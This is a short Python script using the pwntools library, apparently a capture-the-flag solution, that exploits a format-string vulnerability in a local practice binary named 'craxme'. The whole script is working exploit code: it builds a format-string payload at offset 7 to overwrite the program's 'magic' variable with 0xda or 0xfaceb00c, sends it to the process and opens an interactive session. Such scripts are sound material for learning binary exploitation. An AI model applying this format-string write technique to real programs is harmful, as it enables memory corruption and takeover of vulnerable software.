#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from sys import argv
context.log_level = "debug"

magicAddr = ELF("./craxme").sym["magic"]

if argv[1] == "1":
    payload = fmtstr_payload(7, {magicAddr: 0xda})
else:
    payload = fmtstr_payload(7, {magicAddr: 0xfaceb00c})

io = process("./craxme")
io.sendlineafter(" :", payload)
io.interactive()
io.close()
